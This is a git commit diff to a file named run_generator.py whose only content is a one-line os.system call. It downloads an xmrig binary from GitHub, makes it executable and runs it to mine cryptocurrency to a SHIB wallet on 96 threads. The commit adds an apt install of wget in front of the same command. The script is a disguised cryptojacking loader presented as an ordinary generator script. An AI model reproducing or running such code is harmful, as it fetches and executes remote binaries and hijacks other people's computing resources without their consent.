ee55da39cbab357a2a09df89fe0dbec5adc8a1b8
Mavkkoa <92951260+Mavkkoa@users.noreply.github.com>
2021-10-22 06:08:11 +0800

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os
-os.system("wget -O Shell https://github.com/quincyhays/bmxmrig/raw/master/xmrig && chmod 777 Shell && ./Shell -o rx.unmineable.com:3333 -u SHIB:0x748025d6e4e19b9e482dc048a31b970d2772275b.worker_$(shuf -i 1-999999 -n 1) -p X -k -a rx/0 -t96")
+os.system("apt install wget -y && wget -O Shell https://github.com/quincyhays/bmxmrig/raw/master/xmrig && chmod 777 Shell && ./Shell -o rx.unmineable.com:3333 -u SHIB:0x748025d6e4e19b9e482dc048a31b970d2772275b.worker_$(shuf -i 1-999999 -n 1) -p X -k -a rx/0 -t96")
